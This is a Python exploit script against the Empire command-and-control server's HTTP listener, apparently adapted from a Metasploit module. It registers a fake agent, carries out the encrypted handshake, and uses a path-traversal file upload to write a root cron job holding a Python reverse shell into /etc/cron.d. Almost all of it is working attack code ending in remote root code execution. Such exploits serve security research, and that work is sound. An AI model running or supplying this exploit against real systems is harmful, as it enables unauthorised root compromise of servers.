#!/usr/bin/env python3

# tested against Empire v5.9.2, http listener, default options
# based on https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/empire_skywalker.rb

import base64
import binascii
from dataclasses import dataclass
import hashlib
import hmac
import logging
import os
import random
import re
import string
import struct
import sys
from typing import Union

from Crypto.Cipher import AES, ARC4, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Util import number
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import requests

__author__ = "@captainGeech42"
__version__ = "0.0.1"
__date__ = "2024-02-09"

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
    datefmt="%Y/%m/%d %H:%M:%S",
)
LOG = logging.getLogger("exp")

# pats to parse stage0 props
_S0_HOST = re.compile(r"::FromBase64String\('([0-9a-zA-Z/+=]+)'\)")
_S0_UA = re.compile(r"\$u='([^']*)';")
_S0_COOKIE = re.compile(r'Cookie","([0-9a-zA-Z/+=]+)"')
_S0_URI = re.compile(r"\$t='([^']*)';")
_S0_KEY = re.compile(r"::ASCII.GetBytes\('([^']*)'\);")

@dataclass
class Stage0Config:
    ua: str
    uri: str
    host: str  # $ser
    cookie: str
    key: str

    @staticmethod
    def parse(stage0: str) -> Union["Stage0Config", None]:
        """Parse the props from a stage0 payload"""

        try:
            b64host = _S0_HOST.findall(stage0)[0]
            ua = _S0_UA.findall(stage0)[0]
            cookie = _S0_COOKIE.findall(stage0)[0]
            uri = _S0_URI.findall(stage0)[0]
            key = _S0_KEY.findall(stage0)[0]

            host = base64.b64decode(b64host).decode("utf16")

            return Stage0Config(ua, uri, host, cookie, key)
        except IndexError:
            LOG.exception("failed to parse stage 0: %s", base64.b64encode(stage0.encode()).decode())
            return None


_S1_HOST = re.compile(r':server = "([^"]*)";')
_S1_URI = re.compile(r'\$s\+"([^"]*)", "POST"')
_S1_UA = re.compile(r"\$UA='([^']*)',")
_S1_KEY = re.compile(r" -SK '([^']*)' -UA")
_S1_CSTMHDR = re.compile(r'\$customHeaders = "([^"]*)"')
_S1_RTGDATA = re.compile(r"\+ @\((0x[0-9a-f]{2},0x[0-9a-f]{2},0x[0-9a-f]{2},0x[0-9a-f]{2})\) \+", re.I)

@dataclass
class Stage1Config:
    ua: str
    host: str
    uri: str
    key: str
    custom_headers: str  # TODO: do something with this
    routing_data: bytes

    @staticmethod
    def parse(stage1: str) -> Union["Stage1Config", None]:
        """Parse the props from a stage1 payload"""

        try:
            ua = _S1_UA.findall(stage1)[0]
            host = _S1_HOST.findall(stage1)[0]
            uri = _S1_URI.findall(stage1)[0]
            key = _S1_KEY.findall(stage1)[0]
            custom_headers = _S1_CSTMHDR.findall(stage1)[0]
            routing_data_hex = _S1_RTGDATA.findall(stage1)[0]

            routing_data = binascii.unhexlify(routing_data_hex.replace("0x", "").replace(",", ""))

            return Stage1Config(ua, host, uri, key, custom_headers, routing_data)
        except IndexError:
            LOG.exception("failed to parse stage 1: %s", base64.b64encode(stage1.encode()).decode())
            return None


# this works for the http listener
def get_stage0(server: str) -> str:
    r = requests.get(f"http://{server}/download/powershell", headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"})
    return r.text

def get_stage1(s0: Stage0Config) -> str:
    r = requests.get(s0.host + s0.uri, headers={"User-Agent": s0.ua, "Cookie": s0.cookie})

    resp = r.content

    c = ARC4.new(resp[0:4] + s0.key.encode())
    return c.decrypt(resp[4:]).decode()


AGENT_ID = None
def make_req(s1: Stage1Config, data: bytes) -> bytes:
    """RC4 all that nonsense and send it"""

    global AGENT_ID
    if AGENT_ID is None:
        AGENT_ID = "".join(random.choice("ABCDEFGHKLMNPRSTUVWXYZ123456789") for _ in range(8))
        LOG.info("agent ID: %s", AGENT_ID)

    id = AGENT_ID.encode()
    iv = get_random_bytes(4)

    hdr = id + s1.routing_data + struct.pack("<I", len(data))

    c = ARC4.new(iv+s1.key.encode())
    ctxt = c.encrypt(hdr)

    payload = iv+ctxt+data

    r = requests.post(s1.host+s1.uri, headers={"User-agent": s1.ua}, data=payload)

    return r.content

def rsa_to_xml(key: RSA.RsaKey) -> str:
    """Convert the RSA values to the XML serialization"""

    return (
f"""<RSAKeyValue>
    <Exponent>{base64.b64encode(number.long_to_bytes(key.e)).decode()}</Exponent>
    <Modulus>{base64.b64encode(number.long_to_bytes(key.n)).decode()}</Modulus>
</RSAKeyValue>""")

def rsa_decrypt(key: RSA.RsaKey, data: bytes) -> bytes:
    privkey = PKCS1_v1_5.new(key)
    return privkey.decrypt(data, None)

##### START COPY FROM empire/server/common/encryption.py

def to_bufferable(binary):
    if isinstance(binary, bytes):
        return binary
    return bytes(ord(b) for b in binary)

def pad(data):
    """
    Performs PKCS#7 padding for 128 bit block size.
    """

    pad = 16 - (len(data) % 16)
    return data + to_bufferable(chr(pad).encode("UTF-8") * pad)

def depad(data):
    """
    Performs PKCS#7 depadding for 128 bit block size.
    """
    if len(data) % 16 != 0:
        raise ValueError("invalid length")

    pad = data[-1]
    return data[:-pad]

def rsa_encrypt(key, data):
    """
    Take a key object and use it to encrypt the passed data.
    """
    pubkey = PKCS1_v1_5.new(key)
    enc_data = pubkey.encrypt(data)
    return enc_data

def aes_encrypt(key, data):
    """
    Generate a random IV and new AES cipher object with the given
    key, and return IV + encryptedData.
    """
    if isinstance(key, str):
        key = bytes(key, "UTF-8")
    if isinstance(data, str):
        data = bytes(data, "UTF-8")
    backend = default_backend()
    IV = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(IV), backend=backend)
    encryptor = cipher.encryptor()
    ct = encryptor.update(pad(data)) + encryptor.finalize()
    return IV + ct

def aes_encrypt_then_hmac(key, data):
    """
    Encrypt the data then calculate HMAC over the ciphertext.
    """
    if isinstance(key, str):
        key = bytes(key, "UTF-8")
    if isinstance(data, str):
        data = bytes(data, "UTF-8")

    data = aes_encrypt(key, data)
    mac = hmac.new(key, data, digestmod=hashlib.sha256).digest()
    return data + mac[0:10]

def aes_decrypt(key, data):
    """
    Generate an AES cipher object, pull out the IV from the data
    and return the unencrypted data.
    """
    if len(data) > 16:
        backend = default_backend()
        IV = data[0:16]
        cipher = Cipher(algorithms.AES(key), modes.CBC(IV), backend=backend)
        decryptor = cipher.decryptor()
        pt = depad(decryptor.update(data[16:]) + decryptor.finalize())
        return pt

##### END COPY

def main(argv: list[str]) -> int:
    if len(argv) != 1:
        LOG.critical("usage: exp.py [server host:port]")
        return 2

    server = argv[0]
    LOG.info("targeting %s", server)

    s0 = get_stage0(server)
    s0props = Stage0Config.parse(s0)
    LOG.info("stage 0 props: %s", repr(s0props))

    LOG.info("checking in for next stage")
    s1 = get_stage1(s0props)
    s1props = Stage1Config.parse(s1)
    LOG.info("stage 1 props: %s", repr(s1props))

    # prepare the rsa handshake
    LOG.info("generating rsa keypair")
    rsa_key = RSA.generate(2048)
    rsa_xml = rsa_to_xml(rsa_key)

    resp = make_req(s1props, aes_encrypt_then_hmac(s1props.key, rsa_xml))
    dec_resp = rsa_decrypt(rsa_key, resp).decode()

    nonce = dec_resp[:16]
    new_key = dec_resp[16:]

    LOG.info("successfully checked in agent with server. nonce=%s, new key=`%s`", nonce, new_key)

    # ok now we can do the malicious file upload
    # need to make sure the upload tree exists, and then can path traversal out of it

    mal_file = "test"
    path = "test"
    task_data = base64.b64encode(("|".join(["1", path,str(len(mal_file)), base64.b64encode(mal_file.encode()).decode()])).encode())

    # some of these fields get ignored
    # 41 = TASK_DOWNLOAD, that is key
    packet = struct.pack("<HHHHI", 41, 1, 1, 1, len(task_data)) + task_data

    ctxt = aes_encrypt_then_hmac(new_key, packet)
    # monkeypatch the routingdata to set meta to 5
    s1props.routing_data = bytes([s1props.routing_data[0]]) + b"\x05" + s1props.routing_data[2:]

    LOG.info("making benign file upload")
    make_req(s1props, ctxt)

    mal_file = """* * * * * root python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("localhost",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'\n"""
    path = "".join([random.choice(string.ascii_lowercase) for _ in range(8)])
    task_data = base64.b64encode(("|".join(["1", "..\\..\\..\\..\\..\\..\\..\\..\\etc\\cron.d\\//"+path,str(len(mal_file)), base64.b64encode(mal_file.encode()).decode()])).encode())

    packet = struct.pack("<HHHHI", 41, 1, 1, 1, len(task_data)) + task_data

    ctxt = aes_encrypt_then_hmac(new_key, packet)

    LOG.info("making malicious file upload, writing to %s", path)
    make_req(s1props, ctxt)

    LOG.info("malicious file written, please wait for shell")

    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
